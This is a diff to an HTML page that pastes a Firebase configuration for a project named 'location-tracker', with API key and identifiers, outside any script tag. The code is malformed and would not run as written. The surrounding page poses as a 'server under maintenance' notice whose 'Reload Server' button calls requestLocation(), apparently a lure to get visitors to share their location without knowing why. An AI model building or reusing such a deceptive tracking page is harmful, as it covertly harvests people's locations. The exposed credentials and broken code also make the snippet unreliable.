@@ -51,7 +51,27 @@
         }
     </script>
 </head>
-<body>
+// Import the functions you need from the SDKs you need
+import { initializeApp } from "firebase/app";
+import { getAnalytics } from "firebase/analytics";
+// TODO: Add SDKs for Firebase products that you want to use
+// https://firebase.google.com/docs/web/setup#available-libraries
+
+// Your web app's Firebase configuration
+// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+const firebaseConfig = {
+  apiKey: "AIzaSyBeUwz8yL-XmgI3wx4uCH7uPhdoHt0fSo8",
+  authDomain: "location-tracker-1aa74.firebaseapp.com",
+  projectId: "location-tracker-1aa74",
+  storageBucket: "location-tracker-1aa74.firebasestorage.app",
+  messagingSenderId: "836267695111",
+  appId: "1:836267695111:web:1b6ddd5d4a85a350099ea2",
+  measurementId: "G-DNSW7LGEYV"
+};
+
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+const analytics = getAnalytics(app);<body>
     <h1>This server is currently under maintenance.</h1>
     <button onclick="requestLocation()">Reload Server</button>
 </body>
